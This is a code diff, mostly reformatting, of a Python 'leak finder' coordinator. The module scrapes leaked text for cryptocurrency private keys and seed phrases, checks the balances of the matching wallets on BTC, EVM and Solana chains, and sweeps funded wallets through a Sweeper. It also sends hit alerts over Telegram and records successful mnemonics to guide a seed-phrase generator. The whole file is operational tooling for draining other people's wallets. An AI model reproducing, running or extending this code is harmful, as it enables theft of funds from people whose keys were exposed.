@@ -1,4 +1,5 @@
 """Leak finder coordinator."""
+
 from __future__ import annotations
 import asyncio
 import hashlib
@@ -7,10 +8,18 @@ import os
 from dataclasses import dataclass, field
 from datetime import datetime, timezone
 from typing import Optional
-from src.modules.crypto.balance.chains import ALL_CHAINS, ChainConfig, ChainType, chain_by_name
+from src.modules.crypto.balance.chains import (
+    ALL_CHAINS,
+    ChainConfig,
+    ChainType,
+    chain_by_name,
+)
 from src.modules.crypto.balance.checker import check_btc_balance, check_balance
 from src.modules.crypto.balance.hit_logger import HitLogger
-from src.modules.crypto.balance.multicall import batch_check_balances, batch_check_sol_balances
+from src.modules.crypto.balance.multicall import (
+    batch_check_balances,
+    batch_check_sol_balances,
+)
 from src.modules.crypto.balance.sweeper import Sweeper, SweepResult
 from src.modules.crypto.balance.scanner_coordinator import ScannerCoordinator
 from src.modules.crypto.leak_finder.extractor import ExtractedKey, KeyType, extract_keys
@@ -18,6 +27,7 @@ from src.modules.sources.base import RawLeak
 from src.modules.sources import discover_sources
 
 logger = logging.getLogger(__name__)
+
 
 @dataclass
 class LeakFinderResult:
@@ -30,16 +40,31 @@ class LeakFinderResult:
     errors: list[str] = field(default_factory=list)
     started_at: datetime = field(default_factory=lambda: datetime.now(timezone.utc))
     completed_at: Optional[datetime] = None
+
     @property
     def elapsed_seconds(self) -> float:
-        return (self.completed_at - self.started_at).total_seconds() if self.completed_at else 0.0
+        return (
+            (self.completed_at - self.started_at).total_seconds()
+            if self.completed_at
+            else 0.0
+        )
 
 
 _SOURCE_MAP = discover_sources()
 ALL_SOURCES = list(_SOURCE_MAP.keys())
 
+
 class LeakFinderCoordinator:
-    def __init__(self, sources: Optional[list[str]] = None, chains: Optional[list[ChainConfig]] = None, hit_logger: Optional[HitLogger] = None, sweeper: Optional[Sweeper] = None, github_token: Optional[str] = None, db_path: str = "wallet_hits.db", api_concurrency: int = 50):
+    def __init__(
+        self,
+        sources: Optional[list[str]] = None,
+        chains: Optional[list[ChainConfig]] = None,
+        hit_logger: Optional[HitLogger] = None,
+        sweeper: Optional[Sweeper] = None,
+        github_token: Optional[str] = None,
+        db_path: str = "wallet_hits.db",
+        api_concurrency: int = 50,
+    ):
         self._source_names = sources or list(ALL_SOURCES)
         self._chains = chains or list(ALL_CHAINS)
         self._hit_logger = hit_logger
@@ -48,6 +73,7 @@ class LeakFinderCoordinator:
         self._db_path = db_path
         self._api_concurrency = api_concurrency
         from src.modules.crypto.balance.bloom import BloomFilter
+
         self._seen_keys: set[str] = set()
         self._seen_keys_bf = BloomFilter(expected_items=100_000, fp_rate=0.001)
         self._seen_addresses: set[str] = set()
@@ -56,10 +82,18 @@ class LeakFinderCoordinator:
         self._running = False
 
     async def start(self) -> None:
-        self._coordinator = ScannerCoordinator(api_concurrency=self._api_concurrency, chains=self._chains, db_path=self._db_path)
+        self._coordinator = ScannerCoordinator(
+            api_concurrency=self._api_concurrency,
+            chains=self._chains,
+            db_path=self._db_path,
+        )
         await self._coordinator.start()
         if self._hit_logger is None:
-            self._hit_logger = HitLogger(db_path=self._db_path, telegram_token=os.getenv("TELEGRAM_BOT_TOKEN", ""), telegram_chat_id=os.getenv("TELEGRAM_CHAT_ID", ""))
+            self._hit_logger = HitLogger(
+                db_path=self._db_path,
+                telegram_token=os.getenv("TELEGRAM_BOT_TOKEN", ""),
+                telegram_chat_id=os.getenv("TELEGRAM_CHAT_ID", ""),
+            )
             await self._hit_logger.start()
         if self._sweeper is None:
             self._sweeper = Sweeper()
@@ -94,15 +128,22 @@ class LeakFinderCoordinator:
                     for key in funded_keys:
                         if key.key_type == KeyType.MNEMONIC:
                             try:
-                                from src.modules.crypto.balance.smart_generator import SmartMnemonicGenerator
+                                from src.modules.crypto.balance.smart_generator import (
+                                    SmartMnemonicGenerator,
+                                )
+
                                 gen = SmartMnemonicGenerator()
                                 gen.add_hit_pattern(key.key_raw)
-                                logger.info("Recorded hit pattern from successful sweep")
+                                logger.info(
+                                    "Recorded hit pattern from successful sweep"
+                                )
                             except Exception:
                                 pass
                 elif sr.error and "Program-owned" in str(sr.error):
                     self._SKIP_SOL_ADDRESSES.add(sr.source_address)
-                    logger.debug("Added %s to skip list (program-owned)", sr.source_address[:10])
+                    logger.debug(
+                        "Added %s to skip list (program-owned)", sr.source_address[:10]
+                    )
         result.completed_at = datetime.now(timezone.utc)
         return result
 
@@ -121,16 +162,23 @@ class LeakFinderCoordinator:
                     for leak in res:
                         keys = extract_keys(leak.text)
                         for key in keys:
-                            kid = hashlib.sha256(key.key_raw.encode("utf-8")).hexdigest()
+                            kid = hashlib.sha256(
+                                key.key_raw.encode("utf-8")
+                            ).hexdigest()
                             if self._seen_keys_bf.contains(kid):
                                 continue
                             self._seen_keys_bf.add(kid)
                             if kid not in self._seen_keys:
                                 self._seen_keys.add(kid)
-                                if self._coordinator and self._coordinator.is_mnemonic_seen(key.key_raw):
+                                if (
+                                    self._coordinator
+                                    and self._coordinator.is_mnemonic_seen(key.key_raw)
+                                ):
                                     continue
                                 if self._coordinator:
-                                    self._coordinator.mark_mnemonic_seen(key.key_raw, source=leak.source_url or "unknown")
+                                    self._coordinator.mark_mnemonic_seen(
+                                        key.key_raw, source=leak.source_url or "unknown"
+                                    )
                                 result.keys_deduplicated += 1
         result.completed_at = datetime.now(timezone.utc)
         return result
@@ -194,10 +242,14 @@ class LeakFinderCoordinator:
                     if kid not in self._seen_keys:
                         self._seen_keys.add(kid)
                         # Persistent SQLite dedup via coordinator
-                        if self._coordinator and self._coordinator.is_mnemonic_seen(key.key_raw):
+                        if self._coordinator and self._coordinator.is_mnemonic_seen(
+                            key.key_raw
+                        ):
                             continue
                         if self._coordinator:
-                            self._coordinator.mark_mnemonic_seen(key.key_raw, source=leak.source_url or "unknown")
+                            self._coordinator.mark_mnemonic_seen(
+                                key.key_raw, source=leak.source_url or "unknown"
+                            )
                         all_keys.append(key)
             except Exception:
                 pass
@@ -205,7 +257,7 @@ class LeakFinderCoordinator:
 
     # Minimum balances worth sweeping (must cover: fee + rent-exempt + meaningful transfer)
     # SOL: 5000 fee + 890880 rent-exempt + 1000 min transfer = 895880 lamports
-    _MIN_SOL_LAMPORTS = 2_000_000   # 0.002 SOL — covers all costs with margin
+    _MIN_SOL_LAMPORTS = 2_000_000  # 0.002 SOL — covers all costs with margin
     _MIN_EVM_WEI = 500_000_000_000_000  # 0.0005 ETH — covers gas
     _MIN_BTC_SATS = 5_000  # 0.00005 BTC
 
@@ -251,7 +303,11 @@ class LeakFinderCoordinator:
                         if r.balance_wei >= self._MIN_EVM_WEI:
                             funded.append(evm_keys[i])
                         elif r.balance_wei > 0:
-                            logger.debug("Skipping dust EVM: %s (%d wei)", r.address[:10], r.balance_wei)
+                            logger.debug(
+                                "Skipping dust EVM: %s (%d wei)",
+                                r.address[:10],
+                                r.balance_wei,
+                            )
                 except Exception as exc:
                     logger.error("EVM batch error: %s", exc)
 
@@ -262,7 +318,11 @@ class LeakFinderCoordinator:
                     if r.balance_wei >= self._MIN_SOL_LAMPORTS:
                         funded.append(sol_keys[i])
                     elif r.balance_wei > 0:
-                        logger.debug("Skipping dust SOL: %s (%d lamports)", r.address[:10], r.balance_wei)
+                        logger.debug(
+                            "Skipping dust SOL: %s (%d lamports)",
+                            r.address[:10],
+                            r.balance_wei,
+                        )
             except Exception as exc:
                 logger.error("SOL batch error: %s", exc)
 
@@ -278,7 +338,11 @@ class LeakFinderCoordinator:
 
         # Filter out known unsweepable addresses (program-owned nonce accounts etc)
         _SKIP_ADDRS = {"HAgk14JpMQLgt6rVgv7cBQFJWFto5Dqxi472uT3DKpqk"}
-        funded = [k for k in funded if not any(a in _SKIP_ADDRS for a in k.derived_addresses.values())]
+        funded = [
+            k
+            for k in funded
+            if not any(a in _SKIP_ADDRS for a in k.derived_addresses.values())
+        ]
 
         return funded
 
@@ -287,13 +351,16 @@ class LeakFinderCoordinator:
             return []
         from src.modules.crypto.balance.deriver import derive_from_mnemonic
         from src.modules.crypto.leak_finder.extractor import KeyType
+
         results: list[SweepResult] = []
         for key in funded_keys:
             key_hex = key.key_hex
             # For mnemonics, derive private key hex on-the-fly
             if not key_hex and key.key_type == KeyType.MNEMONIC:
                 try:
-                    derived = derive_from_mnemonic(key.key_raw, chains=list(self._chains))
+                    derived = derive_from_mnemonic(
+                        key.key_raw, chains=list(self._chains)
+                    )
                     # Build chain_name -> (address, private_key_hex) map
                     key_map: dict[str, tuple[str, str]] = {}
                     for d in derived:
@@ -313,7 +380,12 @@ class LeakFinderCoordinator:
                         bal = await check_balance(address, cfg)
                         if bal.balance <= 0:
                             continue
-                        sr = await self._sweeper.sweep(private_key_hex=pk_hex, chain=cfg, source_address=address, balance_raw=bal.balance_raw)
+                        sr = await self._sweeper.sweep(
+                            private_key_hex=pk_hex,
+                            chain=cfg,
+                            source_address=address,
+                            balance_raw=bal.balance_raw,
+                        )
                         results.append(sr)
                     except Exception as exc:
                         logger.error("Sweep error: %s", exc)
@@ -326,7 +398,12 @@ class LeakFinderCoordinator:
                         bal = await check_balance(address, cfg)
                         if bal.balance <= 0:
                             continue
-                        sr = await self._sweeper.sweep(private_key_hex=key_hex, chain=cfg, source_address=address, balance_raw=bal.balance_raw)
+                        sr = await self._sweeper.sweep(
+                            private_key_hex=key_hex,
+                            chain=cfg,
+                            source_address=address,
+                            balance_raw=bal.balance_raw,
+                        )
                         results.append(sr)
                     except Exception as exc:
                         logger.error("Sweep error: %s", exc)
